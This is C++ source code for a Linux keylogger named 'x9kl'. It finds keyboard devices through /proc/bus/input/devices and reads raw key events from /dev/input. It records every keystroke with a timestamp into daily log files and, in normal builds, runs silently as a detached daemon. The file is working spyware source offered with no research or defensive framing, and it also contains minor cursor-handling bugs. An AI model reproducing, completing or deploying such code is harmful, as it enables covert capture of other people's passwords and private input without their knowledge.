#include <errno.h>
#include <fcntl.h>
#include <linux/input.h>
#include <sys/select.h>
#include <sys/stat.h>
#include <unistd.h>

#include <chrono>
#include <csignal>
#include <cstring>
#include <ctime>
#include <fstream>
#include <regex>
#include <string>
#include <vector>

#ifdef DEBUG
#define X9KL_DEBUG(...) std::fprintf(stdout, "DEBUG: " __VA_ARGS__)
#define X9KL_ERROR(...) std::fprintf(stderr, "ERROR: " __VA_ARGS__)
#else
#define X9KL_DEBUG(...)
#define X9KL_ERROR(...)
#endif  // DEBUG

struct x9kl_ctx_t {
  bool is_capslock_on;
  bool is_shift_pressed;
  bool is_altgr_pressed;
  uint32_t buffer_cursor;
  std::vector<int> kb_fds;
  std::vector<uint8_t> kb_buffer;
  struct input_event event;

  x9kl_ctx_t() : is_capslock_on{false},
                 is_shift_pressed{false},
                 is_altgr_pressed{false},
                 buffer_cursor{0} {
    memset(&event, 0, sizeof(struct input_event));
  }
};

volatile std::sig_atomic_t must_stop{0};

static void sig_handler(int sig_num) {
  (void)sig_num;

  must_stop = 1;
}

static std::vector<std::string> get_event_files(void) {
  std::vector<std::string> content;

  {
    std::ifstream file{"/proc/bus/input/devices"};
    std::regex kb_regex{"H: Handlers=sysrq kbd (.+?) leds"};
    std::string line;

    while (std::getline(file, line)) {
      std::smatch match;

      if (std::regex_search(line, match, kb_regex)) {
        X9KL_DEBUG("keyboard found, event file: '%s'\n",
                   match[1].str().c_str());
        content.emplace_back(match[1]);
      }
    }
  }

  return content;
}

static std::vector<int> get_keyboard_fds(void) {
  std::vector<int> fds;

  for (auto &event : get_event_files()) {
    int fd = open(std::string("/dev/input/" + event).c_str(), O_RDONLY);

    if (fd > 0) {
      fds.emplace_back(fd);
    }
  }

  return fds;
}

static int initialize_x9kl(x9kl_ctx_t *ctx) {
  X9KL_DEBUG("logs dir: %s\n", LOGS_DIR);

  ctx->kb_fds = get_keyboard_fds();
  if (ctx->kb_fds.empty()) {
    X9KL_ERROR("no keyboards found\n");
    return 1;
  }

  if (mkdir(LOGS_DIR, S_IRWXU | S_IRWXG | S_IRWXO)) {
    if (errno != EEXIST) {
      X9KL_ERROR("fail to create logs dir, error: %s\n", strerror(errno));
      return 1;
    }
  }

  std::signal(SIGINT, sig_handler);
  std::signal(SIGKILL, sig_handler);
  std::signal(SIGTERM, sig_handler);
  std::signal(SIGQUIT, sig_handler);

  return 0;
}

static void destroy_ctx(x9kl_ctx_t *ctx) {
  for (auto &fd : ctx->kb_fds) {
    close(fd);
  }
}

void handle_enter(x9kl_ctx_t *ctx) {
  char date[9]{0}, timestamp[9]{0};

  if (!ctx->event.value || ctx->kb_buffer.empty()) {
    return;
  }

  //{
    auto now =
        std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
    auto time = std::localtime(&now);

    std::strftime(date, sizeof(date), "%d%m%Y", time);
  //}

  std::ofstream log_file{std::string{LOGS_DIR} + "/log_" + date,
                         std::ios::binary | std::ios::app};

  std::vector<uint8_t> date_buff{ (uint8_t)time->tm_hour, (uint8_t)time->tm_min, (uint8_t)time->tm_sec };
  ctx->kb_buffer.insert(ctx->kb_buffer.begin() + ctx->buffer_cursor, KEY_ENTER);
  log_file.write((const char *)date_buff.data(), date_buff.size());
  log_file.write((const char *)ctx->kb_buffer.data(),
                 ctx->kb_buffer.size());

  ctx->kb_buffer.clear();
  ctx->buffer_cursor = 0;
}

void handle_capslock(x9kl_ctx_t *ctx) {
  if (!ctx->event.value) {
    return;
  }

  ctx->is_capslock_on = !ctx->is_capslock_on;
}

void handle_shift(x9kl_ctx_t *ctx) {
  ctx->is_shift_pressed = ctx->event.value;
}

void handle_altgr(x9kl_ctx_t *ctx) {
  ctx->is_altgr_pressed = ctx->event.value;
}

void handle_delete(x9kl_ctx_t *ctx) {
  if (!ctx->event.value) {
    return;
  }

  if (ctx->buffer_cursor < ctx->kb_buffer.size()) {
    ctx->kb_buffer.erase(ctx->kb_buffer.begin() + ctx->buffer_cursor);
  }
}

void handle_backspace(x9kl_ctx_t *ctx) {
  if (!ctx->event.value) {
    return;
  }

  if (!ctx->kb_buffer.empty()) {
    ctx->kb_buffer.erase(ctx->kb_buffer.begin() + (--ctx->buffer_cursor));
  }
}

void handle_arrow(x9kl_ctx_t *ctx) {
  if (!ctx->event.value) {
    return;
  }

  auto current_key = ctx->event.code;

  ctx->buffer_cursor = (current_key == KEY_LEFT) ? (ctx->buffer_cursor - 1)
                                                 : (ctx->buffer_cursor + 1);
}

void handle_key(x9kl_ctx_t *ctx) {
  if (!ctx->event.value) {
    return;
  }

  switch (ctx->event.code) {
    case KEY_ENTER:
      handle_enter(ctx);
      break;
    case KEY_BACKSPACE:
      handle_backspace(ctx);
      break;
    case KEY_CAPSLOCK:
      handle_capslock(ctx);
      break;
    case KEY_DELETE:
      handle_delete(ctx);
      break;
    case KEY_RIGHT:
    case KEY_LEFT:
      handle_arrow(ctx);
      break;
    case KEY_LEFTSHIFT:
      handle_shift(ctx);
      break;
    case KEY_RIGHTALT:
      handle_altgr(ctx);
      break;
    default: {
      //if (ctx->is_capslock_on && (key_char >= 'a' || key_char <= 'z')) {
    //  //  key_char -= 32;
    //  //}

      ctx->kb_buffer.insert(ctx->kb_buffer.begin() + ctx->buffer_cursor++,
                            ctx->event.code);
     }
  }
}

static void mainloop(x9kl_ctx_t *ctx) {
  struct input_event ev;
  fd_set rfds;

  while (!must_stop) {
    FD_ZERO(&rfds);

    for (auto &fd : ctx->kb_fds) {
      FD_SET(fd, &rfds);
    }

    int ret = select(*(ctx->kb_fds.end() - 1) + 1, &rfds, nullptr, nullptr,
                     nullptr);

    if (ret == -1) {
      continue;
    }

    for (auto &fd : ctx->kb_fds) {
      if (FD_ISSET(fd, &rfds)) {
        int n_bytes = read(fd, &ev, sizeof(struct input_event));

        if ((ev.type == EV_KEY) && (n_bytes > 0)) {
          X9KL_DEBUG("event received for key '%d'\n", ev.code);

          ctx->event = ev;
          handle_key(ctx);
        }
      }
    }
  }

  X9KL_DEBUG("finishing mainloop\n");
}

static void run(void) {
  x9kl_ctx_t ctx;

  if (initialize_x9kl(&ctx)) {
    X9KL_ERROR("fail to initialize the context\n");
    std::exit(EXIT_FAILURE);
  }

  mainloop(&ctx);
  destroy_ctx(&ctx);
}

static void run_as_daemon(void) {
  pid_t pid, sid;

  pid = fork();
  if (pid == -1) {
    std::exit(EXIT_FAILURE);
  } else if (pid > 0) {
    std::exit(EXIT_SUCCESS);
  } else {
    umask(0);

    sid = setsid();
    if (sid < 0) {
      std::exit(EXIT_FAILURE);
    }

    chdir("/");

    std::fclose(stdin);
    std::fclose(stdout);
    std::fclose(stderr);

    run();
  }
}

int main(void) {
#ifdef DEBUG
  run();
#else
  run_as_daemon();
#endif  // DEBUG

  std::exit(EXIT_SUCCESS);
}
